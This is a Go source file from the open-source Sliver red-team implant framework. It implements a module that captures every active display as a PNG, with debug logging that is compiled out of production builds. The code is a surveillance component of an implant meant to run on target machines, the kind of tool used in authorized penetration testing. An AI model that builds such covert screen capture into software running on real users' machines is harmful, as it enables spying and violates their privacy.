package screen

/*
	Sliver Implant Framework
	Copyright (C) 2020  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"image"
	"image/png"

	//{{if .Config.Debug}}
	"log"
	//{{end}}
	screen "github.com/kbinani/screenshot"
)

// Screenshot - Retrieve the screenshot of the active displays
func Screenshot() []byte {
	return WindowsCapture()
}

// WindowsCapture - Retrieve the screenshot of the active displays
func WindowsCapture() []byte {
	nDisplays := screen.NumActiveDisplays()

	var all image.Rectangle = image.Rect(0, 0, 0, 0)

	for i := 0; i < nDisplays; i++ {
		rect := screen.GetDisplayBounds(i)
		all = rect.Union(all)
	}
	img, err := screen.Capture(all.Min.X, all.Min.Y, all.Dx(), all.Dy())

	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("Error Capture: %s", err)
		//{{end}}
	}

	var buf bytes.Buffer
	if err != nil {
		//{{if .Config.Debug}}
		log.Println("Capture Error")
		//{{end}}
		return buf.Bytes()
	}

	png.Encode(&buf, img)
	return buf.Bytes()
}
